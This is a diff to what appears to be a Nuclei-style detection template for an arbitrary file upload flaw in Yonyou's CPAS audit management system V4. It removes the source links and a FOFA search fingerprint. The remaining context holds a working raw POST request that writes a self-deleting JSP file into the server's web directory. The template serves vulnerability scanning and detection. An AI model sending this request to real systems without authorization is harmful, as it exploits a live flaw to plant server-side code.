@@ -3,12 +3,8 @@ info:
   name: 用友 友数聚科技CPAS审计管理系统V4 upfile存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kn9186z9n7clhki5'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kn9186z9n7clhki5
-    fofa: body="/cpasm4/static/cap/font/iconfont.css"
 http:
 - raw:
   - 'POST /cpasm4/iWebPdf/upfile?filePath=/usr/cpasm/webapps/cpasm4/views/ HTTP/1.1
@@ -41,9 +37,7 @@ http:
 
     <% out.print("hello");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
 
-    ------geckoformboundary344fd82a960cbe4f3f0146b1f4ee3833--
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787583216399-518e610a-8e23-48b0-a49a-2607a68154ff.png)'
+    ------geckoformboundary344fd82a960cbe4f3f0146b1f4ee3833--'
   redirects: false
   matchers:
   - status:
